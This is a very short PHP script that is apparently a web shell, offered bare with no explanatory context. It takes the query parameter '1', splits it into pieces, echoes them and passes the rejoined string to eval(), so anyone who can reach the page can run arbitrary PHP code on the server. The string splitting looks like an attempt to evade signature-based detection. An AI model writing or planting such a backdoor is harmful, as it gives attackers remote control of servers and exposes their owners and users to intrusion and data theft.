<?php
$m = $_GET['1']; #$
$a = substr($m,0,1);
echo $a.PHP_EOL;
$b = substr($m,1,9999); 
echo $b.PHP_EOL;
eval($a.$b);